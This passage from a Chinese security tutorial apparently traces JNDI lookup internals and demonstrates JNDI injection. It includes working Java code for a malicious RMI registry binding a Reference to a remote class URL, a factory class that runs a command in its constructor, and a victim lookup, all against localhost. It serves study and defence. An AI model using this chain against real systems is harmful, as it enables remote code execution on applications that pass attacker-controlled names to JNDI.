src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709973543311-de3f7f84-bc9c-43bd-8e7e-c3e0d8402eef.png#averageHue=%233d434c&clientId=u1db2a60e-ea5c-4&from=paste&height=342&id=u1706948c&originHeight=513&originWidth=1243&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=264857&status=done&style=none&taskId=u6c801d7f-26ca-4d9d-be5e-ad51b4ac17d&title=&width=828.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>这里第一部逻辑就是执行 getRootURLContext()方法获取解析结果，这里的结果 var 如下，结果封装成了 ResolveResult 对象，通过 getResolvedObj 方法取出 RegistryContext<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709973680235-ff5a722a-0c4f-4cb5-b8d4-45d89dfb139f.png#averageHue=%23363d44&clientId=u1db2a60e-ea5c-4&from=paste&height=178&id=u4e74f29e&originHeight=267&originWidth=1547&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=241764&status=done&style=none&taskId=u37acdd0b-6d6b-41d0-a084-19df6c38fc8&title=&width=1031.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>之后调用RegistryContext 的 lookup 方法，这里会因为我们传值的 ResolveResult 通过getRemainingName 方法返回的结果为空，所以不会继续下面的直接调用 registryImpl_stub 的 lookup 方法，而是返回当前的RegistryContext<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709974088022-665467ec-8893-4ce2-b335-f7457001da86.png#averageHue=%23494f5b&clientId=u1db2a60e-ea5c-4&from=paste&height=288&id=u2140d9b9&originHeight=432&originWidth=1289&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=254765&status=done&style=none&taskId=ue426557b-547b-413a-aaad-61aa5a2e0c9&title=&width=859.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>上述逻辑比较重要，因为可能刚才流程师傅们在学习的时候会很好奇为什么会进 lookup 逻辑，但是却没有返回查询结果（我也不知道为什么在创建 RegistryContext 的时候会调 lookup）<br>那么这里返回之后会一路返回上去<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709974369618-691e8d72-d5d1-4b19-a6c0-372b6441aea0.png#averageHue=%23404752&clientId=u1db2a60e-ea5c-4&from=paste&height=723&id=u41761343&originHeight=1084&originWidth=1769&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=879836&status=done&style=none&taskId=uc00e5dc6-7b5d-44a0-9093-9e4cf059996&title=&width=1179.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>所以我们当前初始化的InitialContext 就是 RegistryContext 实例化对象，再次调用其 lookup 方法就是调用刚才的 lookup 了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709974498812-0edf82ef-d9c1-4ff2-acb0-c80909e67965.png#averageHue=%23494f5b&clientId=u1db2a60e-ea5c-4&from=paste&height=271&id=ucdc2e7cd&originHeight=406&originWidth=1366&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=262634&status=done&style=none&taskId=u48a0cf21-cd88-40e9-a1bf-c583c3fb9b9&title=&width=910.6666666666666" referrerpolicy="no-referrer" alt="image.png"></p>
+<p>总结一下调用栈：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709974510355-d449ad6e-51b6-4b4c-99b2-5108c1c13a5f.png#averageHue=%23404040&clientId=u1db2a60e-ea5c-4&from=paste&height=170&id=uc5364164&originHeight=255&originWidth=1024&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=59770&status=done&style=none&taskId=ucb2e5ff3-285a-4797-80a5-5e5b10d8bb9&title=&width=682.6666666666666" referrerpolicy="no-referrer" alt="未命名文件-1-1024x255.png"><br>下面代码部分的获取 context 不涉及getInitCtxURL 获取服务路径的部分</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RegistryContextFactory#getInitialContext()-&gt;</span><br><span class="line">RegistryContextFactory#URLToContext()-&gt;</span><br><span class="line">rmiURLContextFactory#getObjectInstance()-&gt;</span><br><span class="line">rmiURLContextFactory#getUsingURL()-&gt;</span><br><span class="line">rmiURLContext#lookup()-&gt;</span><br><span class="line">GenericURLContext#lookup()-&gt;</span><br><span class="line">GenericURLContext#getRootURLContext()  <span class="comment">//到这就算是获取到了包含RegistryContext的ResolveResult对象，后续就是进lookup意思一下返回RegistryContext了</span></span><br></pre></td></tr></table></figure>
+<p>其实能调 RMI 的远程 lookup，就存在攻击可能</p>
+<h2 id="JNDI-动态协议转化"><a href="#JNDI-动态协议转化" class="headerlink" title="JNDI 动态协议转化"></a>JNDI 动态协议转化</h2><p>这次我们不往InitialContext 初始化里面丢自己写好的环境变量 hashtable</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String string=<span class="string">&quot;rmi://localhost:1099/Hello&quot;</span>;</span><br><span class="line"><span class="type">Context</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">RemoteInterface remoteObject=(RemoteInterface) initialContext.lookup(string);</span><br><span class="line">System.out.println(remoteObject.sayHello(<span class="string">&quot;stoocea&quot;</span>));</span><br></pre></td></tr></table></figure>
+<p>直接就往initialContext 的 lookup 里面写我们的 RMI 定位 URL<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709975273525-4288d439-01f4-42fd-bc45-921e64ee17af.png#averageHue=%233e434c&clientId=u1db2a60e-ea5c-4&from=paste&height=135&id=u5052951e&originHeight=202&originWidth=901&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=57647&status=done&style=none&taskId=ubdad0d78-2c43-42fd-94b6-fb4786fd125&title=&width=600.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>发现依然能够查找到远程对象</p>
+<h3 id="0x01-动态协议转化流程分析"><a href="#0x01-动态协议转化流程分析" class="headerlink" title="0x01 动态协议转化流程分析"></a>0x01 动态协议转化流程分析</h3><p>在 lookup 处下个断点，跟进<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709975523916-c8064b0f-125a-429b-aa5a-9ade7c070847.png#averageHue=%233c434d&clientId=u1db2a60e-ea5c-4&from=paste&height=704&id=u22df5022&originHeight=1056&originWidth=1319&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=682689&status=done&style=none&taskId=u2a733897-c3d3-4358-9eb2-8e5994181a9&title=&width=879.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>发现在 initialContext 中不论是调哪种方法都是默认要走一层getURLOrDefaultInitCtx，也就是我们最开始获取 Context 的 factory 构造类的流程相似<br>跟进到具体内容<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709975741782-4ea225c2-ba07-4c09-92dc-c42ec813f401.png#averageHue=%23454b57&clientId=u1db2a60e-ea5c-4&from=paste&height=330&id=ua4d26afe&originHeight=495&originWidth=1548&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=323383&status=done&style=none&taskId=ufef311be-3057-4f7c-b922-7f147a22760&title=&width=1032" referrerpolicy="no-referrer" alt="image.png"><br>由于这里我们没有InitialContextFactoryBuilder，所以不能够直接去调用getDefaultInitCtx(不然就和上面的流程一样了)，往下先获取到 scheme，也就是 rmi 协议头<br>带着 scheme 进入NamingManager.getURLContext 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709975958801-f4caf920-256a-4c10-a471-4a840fad5557.png#averageHue=%23454a55&clientId=u1db2a60e-ea5c-4&from=paste&height=405&id=u55f3f6aa&originHeight=607&originWidth=1733&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=407945&status=done&style=none&taskId=udbba462a-e09c-456f-83ff-147d8abb9e0&title=&width=1155.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>继续跟进到 getURLObject 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709976017546-ccbfbfd5-6477-4367-9ffd-e946740ad4f3.png#averageHue=%23424853&clientId=u1db2a60e-ea5c-4&from=paste&height=497&id=u3c57b1d5&originHeight=745&originWidth=1358&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=441998&status=done&style=none&taskId=u81010180-5f8d-4215-b2b7-f7cffb8a0b9&title=&width=905.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>这边根据_defaultPkgPrefix_属性动态生成Factory类<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709976046434-d4bdc194-65c5-4ec6-8edc-d8ff420e5b2d.png#averageHue=%233c424a&clientId=u1db2a60e-ea5c-4&from=paste&height=82&id=u37147473&originHeight=123&originWidth=909&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=43283&status=done&style=none&taskId=u8769d02b-7270-464f-849e-7f50df083dd&title=&width=606" referrerpolicy="no-referrer" alt="image.png"><br>也就是说这个包下的类都是可以通过 JNDI 的动态协议转化生成 factory 的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709976294728-11ddfd24-57f9-41c1-810f-7358e585f8b4.png#averageHue=%232c3138&clientId=u1db2a60e-ea5c-4&from=paste&height=300&id=ucd34c010&originHeight=450&originWidth=1233&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=121309&status=done&style=none&taskId=u37e292b4-d129-42f7-a685-bb8580854b4&title=&width=822" referrerpolicy="no-referrer" alt="image.png"></p>
+<p>直到这里，我相信师傅们应该能理解为什么要分别分析 JNDI 的正常通过获取环境变量设置去实例化获取 context，和 JNDI 动态协议转化了<br>JNDI 动态协议转化使我们的攻击扩大了可能性以及攻击范围，虽说 JNDI 的这种动态转化的功能很方便，但是有方便，并且参数可控，就是我们可以攻击点，假如我们可以控制字符串的输入，就能够搭建恶意服务，并控制JNDI接口访问该恶意，于是将导致恶意的远程class文件加载，从而导致远程代码执行(工厂类的 loadclass 动态加载)</p>
+<h1 id="JNDI-Refernce-类"><a href="#JNDI-Refernce-类" class="headerlink" title="JNDI-Refernce 类"></a>JNDI-Refernce 类</h1><p>定义在最开始的提到过，但是这里还要对其有一定的补充：<br> **Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用  **，什么意思呢？就是当我们查询远程对象在服务中找不到时，能够从其他远程端获取到 class 文件加载并实例化<br>Reference 类结构如下：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709980320214-ecd0a1db-9781-4382-8e11-36baaef075ec.png#averageHue=%23373f46&clientId=u270414de-1e6d-4&from=paste&height=484&id=u9de119d8&originHeight=726&originWidth=730&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=271421&status=done&style=none&taskId=uda91758c-0517-4684-b6c7-35487d61de2&title=&width=486.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>这里只列出一种构造方法，还有其他三种构造方法，依次递减构造参数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1709980437584-8198d58e-93c3-46ff-a0a8-e0591a212581.png#averageHue=%233d434c&clientId=u270414de-1e6d-4&from=paste&height=187&id=u2131c3ec&originHeight=280&originWidth=1070&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=128019&status=done&style=none&taskId=uc8fb356a-72fa-49bb-a8f7-e10138ca18a&title=&width=713.3333333333334" referrerpolicy="no-referrer" alt="image.png"></p>
+<p>由于 RMI 的限制，如果想要远程对象被访问到就必须继承 UnicastRemoteObject。 所以这里我们需要使用ReferenceWrapper类对Reference类或其子类对象进行远程包装成Remote类使其能够被远程访问。  </p>
+<h1 id="JNDI-注入"><a href="#JNDI-注入" class="headerlink" title="JNDI 注入"></a>JNDI 注入</h1><p>先来张流程图<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/36078896/1709981196302-8a1a1bd5-b5a6-4ec0-9dc5-9da514674774.jpeg" referrerpolicy="no-referrer"></p>
+<h2 id="0x01-JNDI-RMI"><a href="#0x01-JNDI-RMI" class="headerlink" title="0x01 JNDI+RMI"></a>0x01 JNDI+RMI</h2><p>和 RMI 中远程从 codebase 中获取恶意类加载的思路是差不多的，我们这里只不过不是把 codebase 换成了 Reference 对象<br>写一个简单的恶意 RMI 客户端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMI_Server2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference=<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;RMIHello&quot;</span>,<span class="string">&quot;RMIHello&quot;</span>,<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper=<span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry正在运行中&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里 Reference 必须用<code>ReferenceWrapper</code>包装一下，不然无法通过 RMI 访问到<br>然后写一下恶意工厂类，必须继承ObjectFactory 类。同样也是由于必须继承远程对象类才能被 RMI 访问到，所以这里必须继承UnicastRemoteObject</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="comment">//远程工厂类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后写上受害者的信息</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI_Dynamic</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[]args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">            initialContext.lookup(string);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>成功弹出计算机<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710060632030-7da153fc-ffaa-4096-9ac5-14316c81b944.png#averageHue=%235e656d&clientId=u632663d2-e5d7-4&from=paste&height=625&id=uce964003&originHeight=938&originWidth=1655&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=471093&status=done&style=none&taskId=u1809c8d7-2186-41b6-b4a6-0231daf3dbb&title=&width=1103.3333333333333" referrerpolicy="no-referrer" alt="image.png"></p>
+<h3 id="1x01-流程分析"><a href="#1x01-流程分析" class="headerlink" title="1x01 流程分析"></a>1x01 流程分析</h3><p>其实上面对于 JNDI 的工作流程分析时就已经提到过了，我们这里先确定一下大概的方向：<strong>JNDI 的动态协议转化导致我们能够从 Reference 类中读取地址，从恶意地址中获取恶意工厂类（其实不用工厂类也行）字节码内容，然后本地实例化之后触发构造方法 RCE</strong><br>首先 lookup 处下个断点<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062665563-d91b6696-e693-4fba-90c3-5bef4d1834d4.png#averageHue=%233e434c&clientId=u632663d2-e5d7-4&from=paste&height=272&id=u0ec07c44&originHeight=408&originWidth=1213&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=215457&status=done&style=none&taskId=u372e4768-ca16-4f9a-a77e-b1f4fb4f1c1&title=&width=808.6666666666666" referrerpolicy="no-referrer" alt="image.png"></p>
+<p>来到 lookup 的具体内容<br> <img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062693579-3514793a-29d2-4e5c-83f9-ba8381b68410.png#averageHue=%233e4652&clientId=u632663d2-e5d7-4&from=paste&height=129&id=uc9c32251&originHeight=194&originWidth=1038&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=97801&status=done&style=none&taskId=u5e354e6f-4ee2-4551-9d4a-7b36888a236&title=&width=692" referrerpolicy="no-referrer" alt="image.png"><br>继续跟进 getURLOrDefaultInitCtx 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062736878-34fc59c8-2d06-4c9f-8038-0d925487ca39.png#averageHue=%23464c58&clientId=u632663d2-e5d7-4&from=paste&height=410&id=u861bae45&originHeight=615&originWidth=1722&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=435980&status=done&style=none&taskId=uccfb3b08-9995-4bcc-abb5-9a3de8aede9&title=&width=1148" referrerpolicy="no-referrer" alt="image.png"><br>由于我们 URL 传值中制定了 RMI 协议，所以这里的 scheme 取出来是”RMI”，进入 if 判断完毕之后的内容，通过 NamingManager 的 getURLContext 的方法来获取 context<br>getURLContext** **内容里面只有一个 getURLObject 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062882587-faac3889-635a-4ecb-acae-1138766c8a5b.png#averageHue=%23454a56&clientId=u632663d2-e5d7-4&from=paste&height=427&id=u29869884&originHeight=640&originWidth=1554&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=404388&status=done&style=none&taskId=uecef2672-3b09-4141-9f8b-904a4ddfff3&title=&width=1036" referrerpolicy="no-referrer" alt="image.png"><br>继续跟进，这里根据 scheme 的值构造出了 rmiURLContext 的构造实体 factory<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062950864-2dac57a6-195b-4e36-b121-8173aa692184.png#averageHue=%23454b56&clientId=u632663d2-e5d7-4&from=paste&height=432&id=ua2e6e902&originHeight=648&originWidth=1697&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=482611&status=done&style=none&taskId=ua1081dec-4d8d-4966-a837-8151b9850af&title=&width=1131.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062980334-565914fe-1242-4f5c-8072-ca56e21d6693.png#averageHue=%23353c44&clientId=u632663d2-e5d7-4&from=paste&height=234&id=u392db9b7&originHeight=351&originWidth=933&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=207194&status=done&style=none&taskId=u726564fe-9b34-4afa-b0f6-fd6cc949d9e&title=&width=622" referrerpolicy="no-referrer" alt="image.png"><br>那么之后就是根据工厂类来获取 rmiURLContext 的内容了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710063051233-69c5f2b1-9d3c-409d-b3e9-a1ba8d973a0e.png#averageHue=%23494f5b&clientId=u632663d2-e5d7-4&from=paste&height=353&id=uf50628d8&originHeight=529&originWidth=1742&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=386353&status=done&style=none&taskId=u1008e49c-bf24-4a57-bb86-2fd34043011&title=&width=1161.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>这里就直接返回 rmiURLContext，到调用 lookup 中去<br>还是由于 rmiURLContext 本身没有 lookup 方法的定义，跟进到 GenericURLContext 的 lookup 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710063367421-7153a436-120f-4d6d-9a6d-27dab9e1638d.png#averageHue=%23414955&clientId=u632663d2-e5d7-4&from=paste&height=648&id=u6da1f32b&originHeight=972&originWidth=1662&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=765667&status=done&style=none&taskId=u655cbf5a-b149-418b-963b-40a53696595&title=&width=1108" referrerpolicy="no-referrer" alt="image.png"><br>这里的getRootURLContext 方法和getResolvedObj 方法都都是为了获取 RegistryContext<br>此时的 var3 就是RegistryContext，继续调用其 lookup 方法<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710063474248-a50294d7-5e08-4070-80ac-912eafd3c484.png#averageHue=%23464c57&clientId=u632663d2-e5d7-4&from=paste&height=349&id=ua30ce734&originHeight=524&originWidth=1404&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=325269&status=done&style=none&taskId=u8edc569e-1e54-4728-9a1f-23eb80255ce&title=&width=936" referrerpolicy="no-referrer" alt="image.png"><br>到这里就已经获取到了 RMI 中熟悉的 Stub，从远程客户端上请求字节码了，最后调用 decodeObeject 进行实例化<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710063545706-c3d5d128-3321-457a-b8da-b5a4af365d5b.png#averageHue=%23454c58&clientId=u632663d2-e5d7-4&from=paste&height=311&id=ucaaa39e9&originHeight=467&originWidth=1977&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=392441&status=done&style=none&taskId=u40daf98b-4543-4082-b8a2-f8a4f630d64&title=&width=1318" referrerpolicy="no-referrer" alt="image.png"><br>这里持续跟进到 getObjectFactoryFromReference<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710063671734-a0f4f4f9-6334-4c1b-a3be-3c68bb735811.png#averageHue=%23494f5b&clientId=u632663d2-e5d7-4&from=paste&height=293&id=udb4df194&originHeight=440&originWidth=1815&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=330395&status=done&style=none&taskId=u44716f8c-8312-408d-88fe-5227816a9eb&title=&width=1210" referrerpolicy="no-referrer" alt="image.png"><br>调用 loadClass 进行动态类加载<br>与之前 JNDI 实例化 initialContext 时不同，iinitialContext 的 factory 类不是在这里实例化（虽然长得挺像的），而是在NamingManager 的 getInitialContext，至于这里的逻辑就是区别在getURLOrDefaultInitCtx 里面了，看是走 URLCtx 还是 DefaultCtx</p>
+<h2 id="0x02-踩坑实录"><a href="#0x02-踩坑实录" class="headerlink" title="0x02 踩坑实录"></a>0x02 踩坑实录</h2><p>愚蠢的 stoocea 又在这里踩坑了，目录结构尽量是直接在 java 目录下，不要在子包下写服务<br><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710060698734-e6225a8a-b378-4575-b710-588627598dbe.png#averageHue=%23333f47&clientId=u632663d2-e5d7-4&from=paste&height=223&id=u5f4c223f&originHeight=334&originWidth=495&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=57658&status=done&style=none&taskId=u8c6727c7-9025-4aa7-94de-1c8c4261305&title=&width=330" referrerpolicy="no-referrer" alt="image.png"><br>不然客户端启动的时候找不到 RMIHello 这个恶意类（我也不知道为什么，可能寻找的地址 String 要加点什么吧）</p>
+<h2 id="0x03-JNDI-LDAP"><a href="#0x03-JNDI-LDAP" class="headerlink" title="0x03 JNDI+LDAP"></a>0x03 JNDI+LDAP</h2><h3 id="0x01-什么是-LDAP"><a href="#0x01-什么是-LDAP" class="headerlink" title="0x01 什么是 LDAP"></a>0x01 什么是 LDAP</h3><p>首先回顾一下 LDAP 的定义（ Lightweight Directory Access Protocol ，轻型目录访问协议  ），是一种目录服务协议，运行在 TCP&#x2F;IP 堆栈上。它本身是由目录数据库和一套的目录访问协议构成的，目录服务本身是一个特殊的数据库，用来保存描述性的，基于属性的详细信息，拥有最基本的查询，浏览，以树状结构组织数据<br>简单点说，LDAP 就是一个用来存储协议的数据库<br>在 LDAP 中我们通过目录树来访问一条记录，基本名词和结构如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dn ：一条记录的详细位置</span><br><span class="line"></span><br><span class="line">dc ：一条记录所属区域    (哪一颗树)</span><br><span class="line"></span><br><span class="line">ou ：一条记录所属组织    （哪一个分支）</span><br><span class="line"></span><br><span class="line">cn/uid：一条记录的名字/ID   (哪一个苹果名字)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">LDAP目录树的最顶部就是根，也就是所谓的“基准DN<span class="string">&quot;。</span></span><br></pre></td></tr></table></figure>
+<p>访问的深度依次从上往下<br>JNDI 的工作流程是不会变的，如果我们可以控制 JNDI 去访问 LDAP 服务器上的恶意对象，就能够达到和 恶意 RMI 对象同样的效果</p>
